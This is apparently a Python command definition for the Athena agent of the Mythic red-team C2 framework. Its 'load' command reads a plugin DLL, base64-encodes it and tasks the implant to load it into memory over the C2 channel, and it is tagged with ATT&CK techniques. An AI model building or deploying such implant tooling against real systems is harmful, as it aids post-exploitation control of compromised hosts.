from mythic_payloadtype_container.MythicCommandBase import *
from mythic_payloadtype_container.MythicRPC import *
import json
import base64
import os

class LoadArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {}

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                j = json.loads(self.command_line)
                self.add_arg("name", j["command"])
            else:
                self.add_arg("name", self.command_line)
                # self.load_args_from_json_string(self.command_line)


class LoadCommand(CommandBase):
    cmd = "load"
    needs_admin = False
    help_cmd = "load cmd"
    description = "This loads a new plugin into memory via the C2 channel."
    version = 1
    author = "@checkymander"
    parameters = []
    attackmapping = ["T1030", "T1129"]
    argument_class = LoadArguments

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        dllFile = os.path.join(self.agent_code_path, "AthenaPlugins","bin", f"{task.args.command_line}.dll")
        dllBytes = open(dllFile, 'rb').read()
        encodedBytes = base64.b64encode(dllBytes)
        task.args.add_arg("assembly", encodedBytes.decode())
        return task

    async def process_response(self, response: AgentResponse):
        pass

